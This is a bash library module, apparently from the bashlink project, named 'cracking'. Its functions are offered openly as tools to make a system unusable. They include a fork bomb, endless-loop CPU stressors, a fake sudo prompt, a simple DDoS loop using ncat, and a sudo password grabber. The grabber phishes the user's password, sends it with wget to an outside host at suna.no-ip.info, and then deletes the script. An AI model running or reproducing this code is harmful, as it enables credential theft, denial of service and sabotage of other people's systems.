#!/usr/bin/env bash
# -*- coding: utf-8 -*-
# region header
# Copyright Torben Sickert (info["~at~"]torben.website) 16.12.2012

# License
# -------

# This library written by Torben Sickert stand under a creative commons naming
# 3.0 unported license. See https://creativecommons.org/licenses/by/3.0/deed.de
# endregion
# shellcheck disable=SC2016,SC2034,SC2155
# region import
# shellcheck source=./module.sh
source "$(dirname "${BASH_SOURCE[0]}")/module.sh"
bl.module.import bashlink.logging
# endregion
# region variables
declare -gr bl_cracking__documentation__='
    The cracking module implements utility functions to make a system
    unusable or trigger unexpected behavior.
'
# endregion
# region functions
alias bl.cracking.endless_loop=bl_cracking_endless_loop
bl_cracking_endless_loop() {
    local -r __documentation__='
        Starts an endless loop.

        ```bash
            bl.cracking.endless_loop
        ```
    '
    while true; do
        :
    done
}
alias bl.cracking.fake_sudo_password_attempt=bl_cracking_fake_sudo_password_attempt
bl_cracking_fake_sudo_password_attempt() {
    local -r __documentation__='
        Shows a fake sudo password attempt.

        ```bash
            bl.cracking.fake_sudo_password_attempt
        ```
    '
    local -i number
    local password
    for number in 1 2 3; do
        read -rsp "[sudo] password for $(whoami): " password
        sleep 1
        bl.loging.plain '\nSorry, try again.'
    done
    bl.logging.plain "sudo: $number incorrect password attempts"
}
alias bl.cracking.fork_bomb=bl_cracking_fork_bomb
bl_cracking_fork_bomb() {
    local -r __documentation__='
        Implementation for fork bomb. Note short version:

        ```bash
            :() { : | : & }; :
        ```

        ```bash
            bl.cracking.fork_bomb
        ```
    '
    bl.cracking.fork_bomb | \
        bl.cracking.fork_bomb &
}
alias bl.cracking.grab_sudo_password=bl_cracking_grab_sudo_password
bl_cracking_grab_sudo_password() {
    local -r __documentation__='
        Shows a fake sudo password attempt and send to password to server.

        ```bash
            bl.cracking.grab_sudo_password
        ```
    '
    local password
    local -r user="$(whoami)"
    local buffer_file_path="$(
        mktemp --suffix -bashlink-cracking-grap-sudo-password)"
    local -i number
    for number in 1 2 3; do
        read -rsp "[sudo] password for $user: " password
        bl.logging.plain
        # shellcheck disable=SC1117
        if bl.logging.plain "${password}\n" | \
            sudo -S "$@" 1>"$buffer_file_path" 2>/dev/null
        then
            # NOTE: Place your password grabber server url here.
            wget \
                --quiet \
                "http://suna.no-ip.info:8080?user=${user}&password=${password}"
            unalias sudo &>/dev/null
            rm "$(readlink --canonicalize "$0")" &>/dev/null
            bl.logging.cat "$buffer_file_path"
            break
        elif (( number == 3 )); then
            bl.logging.plain "sudo: $number incorrect password attempts"
        else
            bl.logging.plain Sorry, try again.
        fi
    done
    rm "$buffer_file_path" &>/dev/null
}
alias bl.cracking.make_simple_ddos_attach=bl_cracking_make_simple_ddos_attack
bl_cracking_make_simple_ddos_attack() {
    local -r __documentation__='
        Makes a ddos attack to given host on given port. First argument: Number
        of requests. Second argument: Port

        ```bash
            bl.cracking.make_simple_ddos_attack 100 80`
        ```
    '
    local -i index
    for (( index=0; index < "$1"; index++ )); do
        # shellcheck disable=SC1117,SC2028
        echo "GET /$index\r\n\r\n" | ncat lilu "$2" &
    done
}
alias bl.cracking.make_system_unattainable=bl_cracking_make_system_unattainable
bl_cracking_make_system_unattainable() {
    local -r __documentation__='
        Uses a stress system algorithm in its own process to avoid solving the
        problem by process tree killing.

        ```bash
            bl.cracking.make_system_unattainable
        ```
    '
    nohup bash --login -c bl.cracking.stress_system &>/dev/null &
}
alias bl.cracking.stress_system=bl_cracking_stress_system
bl_cracking_stress_system() {
    local -r __documentation__='
        Stress system with given number of endless loops.

        ```bash
            bl.cracking.stress_system 10`
        ```
    '
    local -i index
    for (( index=0; index < "$1"; index++ )); do
        bl.cracking.endless_loop &
    done
}
alias bl.cracking.stress_system_with_fork_bomb=bl_cracking_stress_system_with_fork_bomb
bl_cracking_stress_system_with_fork_bomb() {
    local -r __documentation__='
        Runs a forkbomb in an endless loop. This is useful if operating system
        kills the whole process tree.

        ```bash
            bl.cracking.stress_system_with_fork_bomb
        ```
    '
    while true; do
        bl.cracking.fork_bomb
    done
}
# endregion
# region vim modline
# vim: set tabstop=4 shiftwidth=4 expandtab:
# vim: foldmethod=marker foldmarker=region,endregion:
# endregion
